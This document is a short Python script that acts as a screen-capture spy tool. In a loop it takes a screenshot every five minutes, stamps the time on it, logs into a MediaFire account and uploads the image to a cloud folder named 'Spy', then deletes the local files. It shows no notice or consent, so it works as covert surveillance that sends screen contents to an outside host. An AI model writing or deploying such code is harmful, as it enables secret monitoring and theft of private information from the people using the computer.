# Import required packages
import os
import time
import pyautogui
from PIL import Image, ImageFont, ImageDraw
from mediafire.client import MediaFireClient

mediafireAccEmail = ''
mediafireAccPwd = ''

while True:
    # Takes a screenshot and makes it editable
    pyautogui.screenshot(imageFilename='image.png')
    img = Image.open('image.png')
    img_editable = ImageDraw.Draw(img)

    text1 = str(time.strftime("%a, %d %b %Y", time.localtime()))
    text2 = str(time.strftime("%H:%M:%S", time.localtime()))
    filename = str(time.strftime("%H_%M_%S", time.localtime())) + '.png'

    # Writes the time when the screenshot was taken on the image
    img_editable.text((50,50), text1, (237, 230, 211), ImageFont.truetype('font/font.ttf', 60))
    img_editable.text((50,95), text2, (237, 230, 211), ImageFont.truetype('font/font.ttf', 60))
    img.save(filename)

    # Gets the mediafire account and uploads the image
    client = MediaFireClient()
    client.login(
        email=mediafireAccEmail,
        password=mediafireAccPwd,
        app_id='42511')

    print(filename)
    client.upload_file(filename, 'mf:/Spy/')

    os.remove('image.png')
    os.remove(filename)

    # minutes x 60
    time.sleep(5 * 60)